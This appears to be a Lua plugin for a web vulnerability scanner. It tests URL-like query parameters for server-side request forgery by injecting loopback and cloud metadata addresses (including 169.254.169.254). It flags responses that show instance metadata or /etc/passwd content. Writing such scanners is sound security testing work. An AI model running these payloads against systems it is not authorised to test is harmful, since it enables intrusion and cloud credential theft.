-- SSRF Probe: inject internal/cloud metadata URLs into URL-like parameters
local params = {"url", "uri", "path", "dest", "redirect", "next", "target", "link", "src", "source", "file", "fetch"}
local payloads = {
    "http://127.0.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://0.0.0.0/",
}

local parsed = TARGET
if not parsed:find("?") then return end

for _, param in ipairs(params) do
    for _, payload in ipairs(payloads) do
        local test_url = TARGET:gsub("([?&]" .. param .. "=)[^&]*", "%1" .. payload)
        if test_url ~= TARGET then
            local resp = http.get(test_url)
            if resp.status == 200 and (
                resp.body:find("ami%-id") or
                resp.body:find("instance%-id") or
                resp.body:find("local%-ipv4") or
                resp.body:find("root:x:0:0")
            ) then
                report.finding("critical", "ssrf",
                    "SSRF: Internal resource accessible via '" .. param .. "'",
                    "Server fetched internal/cloud metadata URL: " .. payload,
                    test_url
                )
            end
        end
    end
end
